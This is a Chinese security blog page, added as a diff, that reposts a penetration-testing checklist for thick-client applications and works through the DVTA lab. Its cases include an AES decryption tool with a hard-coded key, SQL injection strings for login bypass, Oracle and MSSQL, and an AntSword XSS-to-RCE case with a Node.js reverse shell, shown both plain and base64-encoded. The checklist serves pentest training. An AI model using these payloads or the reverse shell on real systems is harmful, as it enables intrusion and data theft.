@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"mac"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: true,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="分享一个PC客户端渗透测试的checklist，稍微看了一下，方法和思路比我自己做项目时要清晰很多。我自己在做这类cs架构的客户端测试时，一般都是用Fiddler+Proxifer的方式进行代理抓包，代理弄好之后就当成web系统渗透测试。">
+<meta name="keywords" content="记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PC客户端（C-S架构）渗透测试CheckList">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;17&#x2F;PC%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%88C-S%E6%9E%B6%E6%9E%84%EF%BC%89%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CheckList&#x2F;index.html">
+<meta property="og:site_name" content="LionKing">
+<meta property="og:description" content="分享一个PC客户端渗透测试的checklist，稍微看了一下，方法和思路比我自己做项目时要清晰很多。我自己在做这类cs架构的客户端测试时，一般都是用Fiddler+Proxifer的方式进行代理抓包，代理弄好之后就当成web系统渗透测试。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs00.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs01.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs02.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs03.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs04.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs05.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs06.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs07.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs08.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs09.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs10.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs11.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs12.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs23.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs13.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs14.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs15.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs16.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs17.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs18.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs19.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs20.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs21.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs22.png">
+<meta property="og:updated_time" content="2019-11-11T08:41:16.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;github.com&#x2F;theLSA&#x2F;cs-checklist&#x2F;raw&#x2F;master&#x2F;demo&#x2F;cs00.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/09/17/PC%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%88C-S%E6%9E%B6%E6%9E%84%EF%BC%89%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CheckList/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>PC客户端（C-S架构）渗透测试CheckList | LionKing</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LionKing</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">安全小白成长之路</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/17/PC%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%88C-S%E6%9E%B6%E6%9E%84%EF%BC%89%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CheckList/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="LionKing">
+      <meta itemprop="description" content="安全小白，打算用一些方式记录现在以及未来在这个行业中成长的心路历程。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LionKing">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PC客户端（C-S架构）渗透测试CheckList
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-09-17 23:10:29" itemprop="dateCreated datePublished" datetime="2019-09-17T23:10:29+08:00">2019-09-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-11-11 16:41:16" itemprop="dateModified" datetime="2019-11-11T16:41:16+08:00">2019-11-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>分享一个PC客户端渗透测试的checklist，稍微看了一下，方法和思路比我自己做项目时要清晰很多。</p><p>我自己在做这类cs架构的客户端测试时，一般都是用Fiddler+Proxifer的方式进行代理抓包，代理弄好之后就当成web系统渗透测试。</p><a id="more"></a>
+
+<p>而作者的项目里还包括了像逆向这种，一般来说，客户给的测试系统都不会加壳，至少我目前接触到的都未加壳。</p>
+<p>项目地址：<a href="https://github.com/theLSA/CS-checklist" target="_blank" rel="noopener">https://github.com/theLSA/CS-checklist</a></p>
+<hr>
+<h1 id="CS-checklist"><a href="#CS-checklist" class="headerlink" title="CS-checklist"></a><strong>CS-checklist</strong></h1><br>
+
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a><strong>目录</strong></h2><ul>
+<li><a href="#cs-checklist"><strong>CS-checklist</strong></a><ul>
+<li><a href="#0x00-前言"><strong>0x00 前言</strong></a></li>
+<li><a href="#0x01-概述"><strong>0x01 概述</strong></a></li>
+<li><a href="#0x02-开发语言"><strong>0x02 开发语言</strong></a></li>
+<li><a href="#0x03-协议"><strong>0x03 协议</strong></a></li>
+<li><a href="#0x04-数据库"><strong>0x04 数据库</strong></a></li>
+<li><a href="#0x05-测试工具"><strong>0x05 测试工具</strong></a></li>
+<li><a href="#0x06-代理设置"><strong>0x06 代理设置</strong></a></li>
+<li><a href="#0x07-测试点"><strong>0x07 测试点</strong></a><ul>
+<li><a href="#0-信息收集"><strong>0.</strong> <strong>信息收集</strong></a></li>
+<li><a href="#1-逆向工程"><strong>1.</strong> <strong>逆向工程</strong></a></li>
+<li><a href="#2-信息泄露"><strong>2.</strong> <strong>信息泄露</strong></a></li>
+<li><a href="#3-传输流量"><strong>3.</strong> <strong>传输流量</strong></a></li>
+<li><a href="#4-其他漏洞"><strong>4.</strong> <strong>其他漏洞</strong></a><ul>
+<li><a href="#爆破"><strong>爆破</strong></a></li>
+<li><a href="#用户名枚举"><strong>用户名枚举</strong></a></li>
+<li><a href="#sql语句暴露"><strong>SQL语句暴露</strong></a></li>
+<li><a href="#sql注入"><strong>SQL注入</strong></a></li>
+<li><a href="#csv注入"><strong>CSV注入</strong></a></li>
+<li><a href="#弱口令"><strong>弱口令</strong></a></li>
+<li><a href="#xss"><strong>XSS</strong></a></li>
+<li><a href="#命令执行"><strong>命令执行</strong></a></li>
+<li><a href="#逻辑缺陷"><strong>逻辑缺陷</strong></a></li>
+<li><a href="#密码明文传输"><strong>密码明文传输</strong></a></li>
+<li><a href="#dll劫持"><strong>DLL劫持</strong></a></li>
+<li><a href="#授权认证缺陷"><strong>授权认证缺陷</strong></a></li>
+<li><a href="#越权"><strong>越权</strong></a></li>
+<li><a href="#未授权"><strong>未授权</strong></a></li>
+<li><a href="#溢出"><strong>溢出</strong></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#0x08-相关技巧"><strong>0x08 相关技巧</strong></a></li>
+<li><a href="#0x09-参考资料相关资源"><strong>0x09 参考资料&amp;&amp;相关资源</strong></a></li>
+</ul>
+</li>
+</ul>
+<br>
+
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong>0x00 前言</strong></h2><p>本项目主要针对pc客户端（cs架构）渗透测试，结合自身测试经验和网络资料形成checklist，如有任何问题，欢迎联系，期待大家贡献更多的技巧和案例。</p>
+<br>
+
+<h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a><strong>0x01 概述</strong></h2><p>PC客户端，有丰富功能的gui，c-s架构。</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs00.png" alt="cs00"></p>
+<p>//图片源自:</p>
+<p><a href="#article">https://resources.infosecinstitute.com/practical-thick-client-application-penetration-testing-using-damn-vulnerable-thick-client-app-part-1/#article</a></p>
+<br>
+
+<h2 id="0x02-开发语言"><a href="#0x02-开发语言" class="headerlink" title="0x02 开发语言"></a><strong>0x02 开发语言</strong></h2><p>C#(.NET)，JAVA，DELPHI，C，C++……</p>
+<br> 
+
+<h2 id="0x03-协议"><a href="#0x03-协议" class="headerlink" title="0x03 协议"></a><strong>0x03 协议</strong></h2><p>TCP、HTTP(S)，TDS……</p>
+<br> 
+
+<h2 id="0x04-数据库"><a href="#0x04-数据库" class="headerlink" title="0x04 数据库"></a><strong>0x04 数据库</strong></h2><p>oracle，mssql，db2……</p>
+<br> 
+
+<h2 id="0x05-测试工具"><a href="#0x05-测试工具" class="headerlink" title="0x05 测试工具"></a><strong>0x05 测试工具</strong></h2><p>//相关工具下载：<a href="https://github.com/theLSA/hack-cs-tools" target="_blank" rel="noopener">https://github.com/theLSA/hack-cs-tools</a></p>
+<p>dvta： pc客户端靶场</p>
+<p>ida pro： 静态分析工具</p>
+<p>ollydbg：动态分析工具</p>
+<p>CFF Explorer：PE文件分析</p>
+<p>PEID：查壳工具</p>
+<p>exeinfope/studype：pe文件分析</p>
+<p>wireshark：观察流量</p>
+<p>tcpview：观察tcp流量</p>
+<p>echo Mirage：可拦截tcp流量</p>
+<p>burpsuite：http(s)抓包</p>
+<p>proxifier：全局代理流量</p>
+<p>procmon：文件和注册表监控</p>
+<p>regshot：注册表变化对比</p>
+<p>process Hacker：进程分析</p>
+<p>RegfromApp：注册表监控</p>
+<p>WSExplorer：岁月联盟进程抓包工具</p>
+<p>strings：查看程序的字符串</p>
+<br> 
+
+<p>.net[反]编译：</p>
+<p>dotpeek</p>
+<p>de4dot</p>
+<p>dnspy</p>
+<p>ilspy</p>
+<p>sae</p>
+<p>ildasm</p>
+<p>ilasm</p>
+<br> 
+
+<p>Java反编译</p>
+<p>jad</p>
+<p>jd-gui</p>
+<p>jadx</p>
+<p>dex2jar</p>
+<p>在线版：<br><br><a href>javare.cn</a></p>
+<p><a href="http://www.javadecompilers.com" target="_blank" rel="noopener">www.javadecompilers.com</a></p>
+<br>
+
+<p>Reflexil：组装编辑器（可以作为ilspy插件）</p>
+<p>Vcg：自动化代码审计工具</p>
+<p>BinScope：二进制分析工具</p>
+<br> 
+
+<h2 id="0x06-代理设置"><a href="#0x06-代理设置" class="headerlink" title="0x06 代理设置"></a><strong>0x06 代理设置</strong></h2><p>大部分客户端没有代理配置功能，需要自行设置全局代理，如下两种方法：</p>
+<p>1）IE-internet设置-连接-局域网设置。</p>
+<p>2）proxifier-proxy server/proxification rules</p>
+<p>//http的流量可以结合burpsuite方便测试（proxy server设置为burp代理地址）。</p>
+<br> 
+
+<h2 id="0x07-测试点"><a href="#0x07-测试点" class="headerlink" title="0x07 测试点"></a><strong>0x07 测试点</strong></h2><br> 
+
+<h3 id="0-信息收集"><a href="#0-信息收集" class="headerlink" title="0. 信息收集"></a><strong>0.</strong> <strong>信息收集</strong></h3><p>编译信息，开发环境/语言，使用协议，数据库，ip，混淆/加密，是否加壳等。</p>
+<br>
+
+<p>案例0-CFF查看客户端信息（如编译环境）</p>
+<p>dvta</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs01.png" alt="cs01"></p>
+<p><br><br> </p>
+<h3 id="1-逆向工程"><a href="#1-逆向工程" class="headerlink" title="1. 逆向工程"></a><strong>1.</strong> <strong>逆向工程</strong></h3><p>反编译，源代码泄露，硬编码key/password，加解密逻辑，角色判断逻辑（0-admin，1-normaluser），后门等。 </p>
+<br>
+
+<p>案例0-反编译获取加解密逻辑并编写解密工具</p>
+<p>dvta</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs02.png" alt="cs02"></p>
+<p>通过该逻辑和获取的信息</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs03.png" alt="cs03"></p>
+<p><strong>Encrypted Text:</strong> CTsvjZ0jQghXYWbSRcPxpQ==</p>
+<p><strong>AES KEY:</strong> J8gLXc454o5tW2HEF7HahcXPufj9v8k8</p>
+<p><strong>IV:</strong> fq20T0gMnXa6g0l4</p>
+<p>编写解密工具</p>
+<p><code>using System;</code><br><code>using System.Collections.Generic;</code><br><code>using System.ComponentModel;</code><br><code>using System.Data;</code></p>
+<p><code>using System.Drawing;</code></p>
+<p><code>using System.Linq;</code></p>
+<p><code>using System.Text;</code></p>
+<p><code>using System.Threading.Tasks;</code></p>
+<p><code>using System.Windows.Forms;</code></p>
+<p><code>using System.Security.Cryptography;</code></p>
+<p><code>namespace aesdecrypt</code></p>
+<p><code>{</code></p>
+<p>​    <code>public partial class aesdecrypt : Form</code></p>
+<p>​    <code>{</code></p>
+<p>​        <code>public aesdecrypt()</code></p>
+<p>​        <code>{</code></p>
+<p>​            <code>InitializeComponent();</code></p>
+<p>​        <code>}</code></p>
+<p>​        <code>private void decrypt(object sender, EventArgs e)</code></p>
+<p>​        <code>{</code></p>
+<p>​            <code>String key = “J8gLXc454o5tW2HEF7HahcXPufj9v8k8”;</code></p>
+<p>​            <code>String IV = “fq20T0gMnXa6g0l4”;</code></p>
+<p>​            <code>String encryptedtext = “CTsvjZ0jQghXYWbSRcPxpQ==”;</code></p>
+<p>​            <code>byte[] encryptedBytes = Convert.FromBase64String(encryptedtext);</code></p>
+<p>​            <code>AesCryptoServiceProvider aes = new AesCryptoServiceProvider();</code></p>
+<p>​            <code>aes.BlockSize = 128;</code></p>
+<p>​            <code>aes.KeySize = 256;</code></p>
+<p>​            <code>aes.Key = System.Text.ASCIIEncoding.ASCII.GetBytes(key);</code></p>
+<p>​            <code>aes.IV = System.Text.ASCIIEncoding.ASCII.GetBytes(IV);</code></p>
+<p>​            <code>aes.Padding = PaddingMode.PKCS7;</code></p>
+<p>​            <code>aes.Mode = CipherMode.CBC;</code></p>
+<p>​            <code>ICryptoTransform crypto = aes.CreateDecryptor(aes.Key, aes.IV);</code></p>
+<p>​            <code>byte[] decryptedbytes = crypto.TransformFinalBlock(encryptedBytes, 0, encryptedBytes.Length);</code></p>
+<p>​            <code>String decryptedString = System.Text.ASCIIEncoding.ASCII.GetString(decryptedbytes);</code></p>
+<p>​            <code>Console.WriteLine(“\n”);</code></p>
+<p>​            <code>Console.WriteLine(“##########Decryptig Database password##########\n”);</code></p>
+<p>​            <code>Console.WriteLine(“Decrypted Database password:” + decryptedString+”\n”);</code></p>
+<p>​            <code>Console.WriteLine(“##########Done##########\n”);</code></p>
+<p>​        <code>}</code></p>
+<p>​    <code>}</code></p>
+<p><code>}</code></p>
+<p>//解密代码源自<a href="https://resources.infosecinstitute.com/damn-vulnerable-thick-client-app-part-5/#article" target="_blank" rel="noopener">https://resources.infosecinstitute.com/damn-vulnerable-thick-client-app-part-5/#article</a></p>
+<br>
+
+<p>案例1-反编译修改代码逻辑让普通用户以管理员登录</p>
+<p>dvta</p>
+<p>1-Isadmin</p>
+<p>0-Normaluser</p>
+<p>改1为0即可判断为admin</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs04.png" alt="cs04"></p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs05.png" alt="cs05"></p>
+<p><br><br></p>
+<h3 id="2-信息泄露"><a href="#2-信息泄露" class="headerlink" title="2. 信息泄露"></a><strong>2.</strong> <strong>信息泄露</strong></h3><p>明文敏感信息，敏感文件（如安装目录下的xxx.config）。</p>
+<p>注册表：利用regshot比较客户端运行（如登录）前后注册表差别。 </p>
+<p>开发调试日志泄露（如dvta.exe &gt;&gt; log.txt）</p>
+<p>process hacker查看客户端内存中的明文敏感数据（如账号密码/key）。</p>
+<p>strings直接查看客户端字符串（如ip信息）。</p>
+<p>查看源代码（如github,gitee等）</p>
+<br>
+
+<p>案例0-配置敏感信息泄露</p>
+<p>dvta</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs06.png" alt="cs06"></p>
+<br>
+
+<p>案例1-内存泄露数据库账号密码</p>
+<p>dvta</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs07.png" alt="cs07"></p>
+<br>
+
+<p>案例2-源代码含有硬编码ftp账号密码</p>
+<p>dvta</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs08.png" alt="cs08"></p>
+<br> 
+
+<p>案例3-开发调试日志泄露</p>
+<p>dvta</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs09.png" alt="cs09"></p>
+<br>
+
+<p>案例4-某系统登录后本地保存账号密码</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs10.png" alt="cs10"></p>
+<p>//本案例来源于<a href="https://blog.csdn.net/weixin_30685047/article/details/95916065" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30685047/article/details/95916065</a></p>
+<p><br><br> </p>
+<h3 id="3-传输流量"><a href="#3-传输流量" class="headerlink" title="3. 传输流量"></a><strong>3.</strong> <strong>传输流量</strong></h3><p>wireshark/echo Mirage/burpsuite+nopeproxy/fillder/charles</p>
+<p>ftp等协议明文传输的账号密码</p>
+<p>SQL语句明文传输（如利用构造注入，越权等）</p>
+<br>
+
+<p>案例0-正方教务系统sql语句明文传输，返回明文数据</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs11.png" alt="cs11"></p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs12.png" alt="cs12"></p>
+<p>//本案例来源于wooyun</p>
+<p><br><br></p>
+<h3 id="4-其他漏洞"><a href="#4-其他漏洞" class="headerlink" title="4. 其他漏洞"></a><strong>4.</strong> <strong>其他漏洞</strong></h3><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a><strong>爆破</strong></h4><p>如登录功能。</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs23.png" alt="cs23"></p>
+<br> 
+
+<h4 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a><strong>用户名枚举</strong></h4><p>案例0</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs13.png" alt="cs13"></p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs14.png" alt="cs14"></p>
+<br>
+
+<h4 id="SQL语句暴露"><a href="#SQL语句暴露" class="headerlink" title="SQL语句暴露"></a><strong>SQL语句暴露</strong></h4><p>案例0</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs15.png" alt="cs15"></p>
+<br>
+
+<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h4><p>如登录处，万能密码</p>
+<p>xxx’ or ‘x’=’x</p>
+<p>xxx’ or 1=1–</p>
+<p>输入框处，构造闭合报错，如’、’)、%’)、order by 100–等。</p>
+<p>利用显示位或报错注出数据，原理同web注入，不同数据库大同小异。</p>
+<br> 
+
+<p>案例0-oracle注入</p>
+<p>‘ union select null,null,(select user from dual),null,null,(select banner from sys.v_$version where     rownum=1),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from dual–</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs16.png" alt="cs16"></p>
+<br>
+
+<p>案例1-mssql注入</p>
+<p>111’) and (select user)&gt;0–</p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs17.png" alt="cs17"></p>
+<br>
+
+<h4 id="CSV注入"><a href="#CSV注入" class="headerlink" title="CSV注入"></a><strong>CSV注入</strong></h4><p>如导出excel，输入1+1，导出后看是否为2。</p>
+<br> 
+
+<h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a><strong>弱口令</strong></h4><p>可尝试admin 123456等。</p>
+<br>
+
+<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a><strong>XSS</strong></h4><p>如Electron，NodeWebKit等。</p>
+<br> 
+
+<p>案例0-中国蚁剑xss到rce</p>
+<p>环境：win7+phpstudy(php5.6.27-nts)+perl+nc+antsword2.0.5</p>
+<p>xss webshell：</p>
+<p><code>&lt;?php</code></p>
+<p><code>header(&#39;HTTP/1.1 500 &lt;img src=# onerror=alertx&gt;&#39;);</code></p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs18.png" alt="cs18"></p>
+<p>Win+node.js:</p>
+<p>成功</p>
+<p><code>var net = require(&quot;net&quot;), sh = require(&quot;child_process&quot;).exec(&quot;cmd.exe&quot;);</code></p>
+<p><code>var client = new net.Socket();</code></p>
+<p><code>client.connect(6677, &quot;127.0.0.1&quot;, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);</code></p>
+<p><code>sh.stderr.pipe(client);});</code></p>
+<p><code>&lt;?php</code></p>
+<p><code>header(&quot;HTTP/1.1 500 Not &lt;img src=# onerror=&#39;eval(new Buffer(</code>dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLCBzaCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjKCJjbWQuZXhlIik7CnZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCg2Njc3LCAiMTI3LjAuMC4xIiwgZnVuY3Rpb24oKXtjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTsKc2guc3RkZXJyLnBpcGUoY2xpZW50KTt9KTs=<code>,</code>base64<code>).toString())&#39;&gt;&quot;);</code></p>
+<p><code>?&gt;</code></p>
+<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs19.png" alt="cs19"></p>
+<p>相关参考</p>
+<p><a href="https://www.anquanke.com/post/id/176379" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176379</a></p>
+<br> 
+
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h4><br>
+案例0-印象笔记windows客户端6.15本地文件读取和远程命令执行 
+
